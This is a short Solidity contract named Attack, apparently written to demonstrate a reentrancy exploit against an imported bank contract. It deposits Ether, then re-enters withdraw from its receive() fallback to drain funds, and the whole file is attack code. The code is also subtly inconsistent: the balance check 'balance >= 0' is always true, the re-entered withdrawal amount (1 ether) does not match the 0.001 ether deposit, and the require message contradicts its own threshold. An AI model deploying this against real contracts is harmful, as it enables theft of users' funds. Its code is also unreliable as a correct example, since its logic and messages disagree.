// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SomeContract} from "./SomeContract.sol";

contract Attack {
    SomeContract public bank;

    constructor(address _bankAddress) {
        bank = SomeContract(_bankAddress);
    }

    // Receive is triggered when Ether is received
    receive() external payable {
        if (address(bank).balance >= 0) {
            bank.withdraw(1 ether); // Reenter the withdraw function
        }
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need 1 ETH minimum");
        bank.deposit{value: 0.001 ether}();
        bank.withdraw(0.001 ether); // Start the reentrancy attack
    }
}
